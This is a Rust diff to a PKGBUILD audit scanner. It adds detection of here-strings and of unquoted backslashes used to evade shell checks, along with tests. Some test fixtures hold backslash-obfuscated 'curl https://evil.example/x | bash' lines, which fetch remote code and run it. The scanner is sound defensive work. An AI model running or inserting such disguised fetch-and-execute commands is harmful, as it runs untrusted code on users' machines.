@@ -206,8 +206,9 @@ fn scan_unsupported_shell(rel_path: &str, text: &str, findings: &mut Vec<Finding
     for (line_no, line) in text.lines().enumerate() {
         let trimmed = line.trim();
         let unsupported =
-            re(r"\$\(|`|\$\{|\b(eval|declare\s+-n)\b|<\(|>\(|<<-?[[:space:]]*[A-Za-z_]")
-                .is_match(trimmed);
+            re(r"\$\(|`|\$\{|\b(eval|declare\s+-n)\b|<\(|>\(|<<<|<<-?[[:space:]]*[A-Za-z_]")
+                .is_match(trimmed)
+                || contains_unquoted_backslash(trimmed);
         if unsupported {
             findings.push(
                 Finding::new(
@@ -238,6 +239,42 @@ fn scan_unsupported_shell(rel_path: &str, text: &str, findings: &mut Vec<Finding
             .with_snippet(first_lines(text, 4)),
         );
     }
+}
+
+fn contains_unquoted_backslash(line: &str) -> bool {
+    let mut single = false;
+    let mut double = false;
+    let mut escaped = false;
+
+    for ch in line.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if single {
+            if ch == '\'' {
+                single = false;
+            }
+            continue;
+        }
+        if double {
+            if ch == '\\' {
+                escaped = true;
+            } else if ch == '"' {
+                double = false;
+            }
+            continue;
+        }
+        match ch {
+            '\\' => return true,
+            '\'' => single = true,
+            '"' => double = true,
+            '#' => break,
+            _ => {}
+        }
+    }
+
+    false
 }
 
 fn has_unbalanced_shell_delimiters(text: &str) -> bool {
@@ -651,6 +688,47 @@ mod tests {
             findings
                 .iter()
                 .any(|f| f.rule_id == "manual-review.unsupported-shell")
+        );
+    }
+
+    #[test]
+    fn detects_backslash_shell_evasion_as_manual_review() {
+        for text in [
+            "prepare() {\n  c\\\\url https://evil.example/x | bash\n}",
+            "prepare() {\n  cu\\\nrl https://evil.example/x | bash\n}",
+        ] {
+            let findings = scan_text_file("PKGBUILD", text);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == "manual-review.unsupported-shell"),
+                "{text}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_here_string_as_manual_review() {
+        let findings = scan_text_file("PKGBUILD", "prepare() {\n  bash<<<\"echo hi\"\n}");
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == "manual-review.unsupported-shell")
+        );
+        let report = crate::report::AuditReport::new("fixture", findings, vec![]);
+        assert_ne!(report.status, crate::report::AuditStatus::Pass);
+    }
+
+    #[test]
+    fn quoted_backslash_does_not_require_manual_review() {
+        let findings = scan_text_file(
+            "PKGBUILD",
+            "prepare() {\n  printf '%s\\n' \"hello\"\n  echo \"\\\\\"\n}",
+        );
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule_id == "manual-review.unsupported-shell")
         );
     }
 
